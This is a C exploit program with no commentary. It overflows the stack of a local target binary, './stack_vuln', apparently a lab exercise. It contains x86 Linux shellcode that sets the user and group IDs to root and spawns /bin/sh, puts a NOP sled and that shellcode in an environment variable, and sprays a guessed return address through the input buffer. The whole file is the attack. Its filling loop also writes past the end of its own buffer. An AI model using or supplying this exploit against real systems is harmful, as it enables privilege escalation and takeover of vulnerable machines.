#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[]=
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
"\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
"\xc0\x88\x43\x07\x89\x5b\x08\x89"
"\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
"\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
"/bin/sh";

unsigned long get_sp(void)
{
  __asm__("movl %esp,%eax");
}

int main(int argc, char **argv)
{ 
  int i, offset;
  long esp, ret;
  char buf[500];  char *egg, *ptr;
  char *av[3], *ev[2];

  if (argc < 2) {
    fprintf(stderr, "Usage: %s <offset>\n", argv[0]);
    exit(-1);
  }

  offset = atoi(argv[1]);
  esp = get_sp();
  ret = esp + offset;

  printf("The stack pointer (ESP) is: 0x%x\n", esp);
  printf("The offset from ESP is: 0x%x\n", offset);
  printf("The return address is: 0x%x\n", ret);

  egg = (char *)malloc(1000);
  sprintf(egg, "EGG=");
  memset(egg + 4, 0x90, 1000 - 1 - strlen(shellcode));
  sprintf(egg + 1000 - 1 - strlen(shellcode), "%s", shellcode);

  ptr = buf;
  bzero(buf, sizeof(buf));

  for(i = 0; i <= 500; i += 4)
  {*(long *)(ptr + i) = ret;}

  av[0]= "./stack_vuln";
  av[1]=buf;
  av[2]=0;
  ev[0]=egg;
  ev[1]=0;
  execve(*av, av, ev);

  return 0;
}

